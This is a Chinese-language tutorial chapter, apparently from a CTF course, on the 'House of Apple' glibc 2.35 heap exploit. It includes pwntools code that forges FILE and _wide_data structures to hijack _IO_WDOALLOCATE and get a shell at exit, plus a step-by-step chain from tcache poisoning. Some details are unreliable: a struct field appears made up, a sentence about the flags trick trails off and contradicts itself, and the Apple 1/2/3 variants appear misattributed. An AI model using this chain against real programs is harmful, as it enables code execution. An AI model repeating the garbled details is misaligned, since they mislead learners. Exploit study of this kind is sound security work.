# 第 6 章 House of Apple 完整实战

> glibc 2.35 移除了 hooks，传统 FSOP 又被 vtable 检查拦截。House of Apple 是目前最主流的绕过方案——理解它，你就理解了现代堆利用的终点站。

---

## 6.1 House of Apple 的诞生背景

回顾利用链的演化：

```text
glibc < 2.34: tcache poisoning → __free_hook → system → getshell
glibc 2.34+: hooks 被移除 → 需要新的"目标"
glibc 2.24+: vtable 检查 → 传统 FSOP 需要绕过
```

House of Apple（及其后续 2、3）由 hsq 提出，核心洞察是：

> `_IO_wfile_overflow` 函数内部会调用 `_IO_wdoallocbuf`，后者会调用 `_IO_WDOALLOCATE(fp)` —— 这是一个通过 `_wide_data` 结构间接的函数指针调用，而 `_wide_data` 是我们可以控制的。

---

## 6.2 关键结构：_IO_wide_data

```c
typedef struct _IO_wide_data {
    wchar_t *_IO_read_ptr;
    wchar_t *_IO_read_end;
    wchar_t *_IO_read_base;
    wchar_t *_IO_write_base;
    wchar_t *_IO_write_ptr;
    wchar_t *_IO_write_end;
    wchar_t *_IO_buf_base;
    wchar_t *_IO_buf_end;
    ...
    struct _IO_codecvt *_codecvt;
    void *_wide_data_vtable;     // 关键：这里可以放 system
} _IO_wide_data;
```

在 `_IO_FILE` 结构中，`_wide_data` 指针位于偏移 `0x88`（64 位）。

## 6.3 _IO_wfile_overflow 的调用链

```c
// libio/wfileops.c
int _IO_wfile_overflow (FILE *f, wint_t wch) {
    ...
    if (! _IO_wdoallocbuf (f)) return ...;
    ...
}

// _IO_wdoallocbuf
int _IO_wdoallocbuf (FILE *fp) {
    if (fp->_wide_data->_IO_buf_base) return 0;
    if (!(fp->_flags & _IO_UNBUFFERED)) {
        if ((wint_t)_IO_WDOALLOCATE(fp) != WEOF) return 0;  // ← 间接调用！
    }
    ...
}

// 宏定义
#define _IO_WDOALLOCATE(FP) \
    ((fp)->_wide_data->_wide_vtable->_doallocate)(fp)
```

**关键点**：`_IO_WDOALLOCATE(fp)` 调用的是 `fp->_wide_data->_wide_vtable->_doallocate`。如果我们控制 `_wide_data`，就能控制这个调用！

---

## 6.4 构造伪造的 FILE 结构

### 6.4.1 前置条件

1. 能控制一块内存（通过 tcache poisoning 分配到某处），在其中构造伪造的 FILE 结构
2. 能触发 exit 或 IO 刷新操作（program 的 exit、_IO_flush_all_lockp）

### 6.4.2 构造步骤（glibc 2.35）

```python
from pwn import *

libc = ELF('./libc.so.6')

# 伪造的 FILE 结构（放在可控内存，比如 heap 或 bss）
fake_file_addr = ...
wide_data_addr = fake_file_addr + 0x100

# _IO_FILE 的关键字段
fake_file = flat({
    0x00: 0xfbad0000 | 0x800,          # _flags：设置 _IO_NO_READS 等标志
    0x28: 1,                            # _IO_write_ptr > _IO_write_base 触发 overflow
    0x68: 0,                            # _chain
    0x70: 1,                            # _fileno
    0x88: wide_data_addr,               # _wide_data 指向我们控制的区域
    0xc0: 0,                            # _mode
    0xd8: libc.sym['_IO_wfile_jumps'],  # vtable 指向合法的 _IO_wfile_jumps
})

# 伪造的 _wide_data
fake_wide = flat({
    0x18: 0,                    # _IO_read_ptr 等清零
    0x30: 0,
    0xe0: system_addr,          # _wide_vtable._doallocate = system
})

# 当 _IO_flush_all_lockp 遍历到这个 FILE 时：
# 1. 调用 vtable->_overflow = _IO_wfile_overflow
# 2. _IO_wfile_overflow 调用 _IO_wdoallocbuf
# 3. _IO_wdoallocbuf 调用 _IO_WDOALLOCATE(fp)
# 4. 即调用 system(fp) —— fp 的前 8 字节是 "/bin/sh"！
```

> ⚠️ **关键技巧**：让 FILE 结构的开头（_flags 字段）是 `"/bin/sh\x00"`（8 字节），这样 `system(fp)` 的参数就是 `"/bin/sh"`。但这与 flags 的合法值冲突——需要用 `0x3b010000` 这样的值（既是合法 flags，其低字节又恰好...）。实际中通常用 `b'  /bin/sh'` 这样精心构造的 8 字节，既通过 flags 检查又作为 system 的参数。

### 6.4.3 flags 的构造

经典的 flags 值：`0xfbad0000 | 0x1880`（_IO_MAGIC | _IO_CURRENTLY_PUTTING 等）。

要让 system 的参数是 "/bin/sh"，需要 FILE 开头是 `"/bin/sh\0"`。但这样 `_flags = 0x68732f6e69622f`，不满足 _IO_MAGIC (0xfbad0000) 检查。

**解决方案**：利用 `_IO_WDOALLOCATE(fp)` 传入的 fp 不是 FILE 开头，而是通过 `_wide_data` 的某个偏移。或者用 `one_gadget` 代替 system（不需要参数）。

更通用的做法：

```python
# 使用 one_gadget，不需要参数
wide_vtable_doallocate = libc_base + one_gadget_offset
```

---

## 6.5 完整的利用链

```text
1. tcache poisoning → 把 chunk 分配到 _IO_list_all 或 stdout 附近
2. 写入伪造的 FILE 结构（含 _wide_data 和 _IO_wfile_jumps）
3. 修改 _IO_list_all 指向伪造的 FILE
4. 触发 exit / 程序正常退出
5. _IO_flush_all_lockp → _IO_wfile_overflow → _IO_wdoallocbuf
6. → _IO_WDOALLOCATE → one_gadget → getshell
```

### 6.5.1 触发方式

- 程序调用 `exit()`（最常见）
- 程序从 main 返回（会调用 exit）
- 调用 `fflush(stdout)` 且 stdout 被替换

```python
# 如果程序没有 exit，可以用 largebin attack 修改 _IO_list_all
# 然后在程序退出时自动触发
```

---

## 6.6 与 House of Apple 2/3 的关系

- **House of Apple 1**：利用 `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE`
- **House of Apple 2**：利用 `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_SYSSEEK` 等
- **House of Apple 3**：更复杂的链，适用于不同的检查环境

具体选择哪个取决于：能否控制 `_wide_data`、能否满足 vtable 检查、可用的 gadget 等。做题时先用 Apple 1，不行再试 2/3。

---

## 6.7 常见坑

1. **_wide_data 的偏移**：glibc 2.35 中是 0x88，但不同版本可能不同。用 gdb 查看 `p &((FILE*)0)->_wide_data`。
2. **vtable 检查**：`_IO_wfile_jumps` 的地址必须在 libc 的 `__libc_IO_vtables` 段内。用 `p _IO_wfile_jumps` 确认。
3. **触发条件**：`_IO_write_ptr > _IO_write_base` 才会走 overflow 路径。设置成 `0x28: 1, 0x20: 0`。
4. **_chain 字段**：伪造 FILE 的 `_chain` 最好指向自身或 NULL，避免遍历到非法地址。

---

## 6.8 小结

这一章我们完整学习了 House of Apple：

- **背景**：hooks 移除 + vtable 检查 → 需要新的控制流劫持点
- **核心**：`_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE` 的间接调用
- **构造**：伪造 FILE 结构（vtable = `_IO_wfile_jumps`）+ 伪造 `_wide_data`（放 one_gadget）
- **触发**：exit → `_IO_flush_all_lockp`

这是 glibc 2.35 下最主流的利用终点。下一章我们系统讲 FSOP，把 `_IO_list_all` 的操控讲透。

---

**下一章**：[FSOP：从原理到 getshell](./ch07-FSOP实战.md)
